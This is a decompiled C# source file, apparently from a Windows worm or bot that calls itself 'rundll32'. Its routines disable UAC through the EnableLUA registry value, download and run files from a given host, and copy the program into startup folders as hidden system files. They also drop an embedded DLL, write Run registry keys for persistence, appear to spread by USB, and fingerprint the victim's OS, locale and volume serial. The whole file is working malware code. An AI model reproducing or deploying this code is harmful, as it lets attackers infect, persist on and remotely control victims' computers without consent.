using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using rundll32.Properties;

namespace rundll32;

internal class misc
{
	[DllImport("kernel32.dll")]
	private static extern long GetVolumeInformation(string PathName, StringBuilder VolumeNameBuffer, uint VolumeNameSize, ref uint VolumeSerialNumber, ref uint MaximumComponentLength, ref uint FileSystemFlags, StringBuilder FileSystemNameBuffer, uint FileSystemNameSize);

	public static void disableUAC()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			string text = registryKey.GetValue("EnableLUA")!.ToString();
			if (text == "1")
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			string text2 = registryKey2.GetValue("EnableLUA")!.ToString();
			if (text2 == "1")
			{
				registryKey2.SetValue("EnableLUA", "0");
			}
		}
		catch
		{
		}
	}

	public static void download(string host, string loc, bool execute)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(host, loc);
		if (execute)
		{
			Process.Start(loc);
		}
	}

	public static string GetVolumeSerial(string strDriveLetter)
	{
		uint VolumeSerialNumber = 0u;
		uint MaximumComponentLength = 0u;
		StringBuilder stringBuilder = new StringBuilder(256);
		uint FileSystemFlags = 0u;
		StringBuilder stringBuilder2 = new StringBuilder(256);
		strDriveLetter += ":\\";
		GetVolumeInformation(strDriveLetter, stringBuilder, (uint)stringBuilder.Capacity, ref VolumeSerialNumber, ref MaximumComponentLength, ref FileSystemFlags, stringBuilder2, (uint)stringBuilder2.Capacity);
		return Convert.ToString(VolumeSerialNumber);
	}

	public static void copyToStartup(string[][] dirs, string[][] names)
	{
		int num = 0;
		while (true)
		{
			if (num < dirs.Length)
			{
				for (int i = 0; i < names.Length; i++)
				{
					if (Application.get_ExecutablePath().ToLower() == dirs[num][0].ToLower() + "\\" + names[i][0].ToLower())
					{
						return;
					}
				}
				num++;
				continue;
			}
			for (int j = 0; j < dirs.Length; j++)
			{
				extractMsn(dirs[j][0]);
				for (int k = 0; k < names.Length; k++)
				{
					infect(dirs[j][0], names[k][0], dirs[j][1] + names[k][1]);
				}
			}
			Process.GetCurrentProcess().Kill();
			break;
		}
	}

	private static void extractMsn(string dir)
	{
		string text = dir + "\\MSNMessengerAPI.dll";
		try
		{
			if (!Directory.Exists(dir))
			{
				Directory.CreateDirectory(dir);
			}
			if (File.Exists(text))
			{
				return;
			}
			File.WriteAllBytes(text, Resources.MSNMessengerAPI);
			List<string> list = new List<string>();
			list.Add("attrib +r +s +h +i \"" + text + "\"");
			foreach (string item in list)
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd";
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/c " + item;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo)!.WaitForExit();
			}
		}
		catch
		{
		}
	}

	private static void infect(string dir, string name, string regName)
	{
		string text = dir + "\\" + name;
		try
		{
			List<string> list = new List<string>();
			list.Add("copy /y \"" + Application.get_ExecutablePath() + "\" \"" + text + "\"");
			list.Add("attrib +r +s +h +i \"" + text + "\"");
			foreach (string item in list)
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd";
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/c " + item;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo)!.WaitForExit();
			}
			if (!File.Exists(text))
			{
				return;
			}
			string[] keys = config.keys;
			foreach (string name2 in keys)
			{
				try
				{
					if (Program.usbRun)
					{
						Registry.CurrentUser.OpenSubKey(name2, writable: true)!.SetValue(regName, text + " usb");
					}
					else
					{
						Registry.CurrentUser.OpenSubKey(name2, writable: true)!.SetValue(regName, text);
					}
				}
				catch
				{
				}
				try
				{
					if (Program.usbRun)
					{
						Registry.LocalMachine.OpenSubKey(name2, writable: true)!.SetValue(regName, text + " usb");
					}
					else
					{
						Registry.LocalMachine.OpenSubKey(name2, writable: true)!.SetValue(regName, text);
					}
				}
				catch
				{
				}
			}
			if (Program.usbRun)
			{
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text, "newusb");
				processStartInfo2.WorkingDirectory = dir + "\\";
				Process.Start(processStartInfo2);
			}
			else
			{
				ProcessStartInfo processStartInfo3 = new ProcessStartInfo(text, "new");
				processStartInfo3.WorkingDirectory = dir + "\\";
				Process.Start(processStartInfo3);
			}
		}
		catch
		{
		}
	}

	public static void remove(string[][] dirs, string[][] names)
	{
		for (int i = 0; i < dirs.Length; i++)
		{
			for (int j = 0; j < names.Length; j++)
			{
				_remove(dirs[i][0], names[j][0], dirs[i][1] + names[j][1]);
			}
		}
	}

	private static void _remove(string dir, string name, string regName)
	{
		string text = dir + "\\" + name;
		if (!File.Exists(text))
		{
			return;
		}
		string text2 = new Random().Next(1000, 9999) + ".bat";
		StreamWriter streamWriter = new StreamWriter(text2);
		streamWriter.WriteLine("@echo off");
		streamWriter.WriteLine(":a");
		streamWriter.WriteLine("attrib -r -s -h -i \"" + text + "\"");
		streamWriter.WriteLine("del \"" + text + "\"");
		streamWriter.WriteLine("IF EXIST \"" + text + "\" GOTO a");
		streamWriter.WriteLine("del %0");
		streamWriter.Close();
		Process process = new Process();
		process.EnableRaisingEvents = false;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = text2;
		process.Start();
		string[] keys = config.keys;
		foreach (string name2 in keys)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey(name2, writable: true)!.DeleteValue(regName);
			}
			catch
			{
			}
			try
			{
				Registry.LocalMachine.OpenSubKey(name2, writable: true)!.DeleteValue(regName);
			}
			catch
			{
			}
		}
	}

	public static string FormatBytes(long bytes)
	{
		string[] array = new string[4] { "GB", "MB", "KB", "Bytes" };
		long num = (long)Math.Pow(1024.0, array.Length - 1);
		string[] array2 = array;
		int num2 = 0;
		string arg;
		while (true)
		{
			if (num2 < array2.Length)
			{
				arg = array2[num2];
				if (bytes > num)
				{
					break;
				}
				num /= 1024L;
				num2++;
				continue;
			}
			return "0 Bytes";
		}
		return $"{decimal.Divide(bytes, num):##.##} {arg}";
	}

	public static string getLoc()
	{
		return Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.ToUpper();
	}

	public static string getOS()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string result = "Unknown";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 90:
				result = "wME";
				break;
			case 10:
				result = "W98";
				break;
			case 0:
				result = "W95";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				result = "NT3";
				break;
			case 4:
				result = "NT4";
				break;
			case 5:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					result = "2k0";
					break;
				case 1:
					result = "wXP";
					break;
				case 2:
					result = "2k3";
					break;
				}
				break;
			case 6:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					result = "Vis";
					break;
				case 1:
					result = "Wi7";
					break;
				}
				break;
			}
			break;
		case PlatformID.Unix:
			result = "UNX";
			break;
		case PlatformID.MacOSX:
			result = "OSX";
			break;
		}
		return result;
	}
}
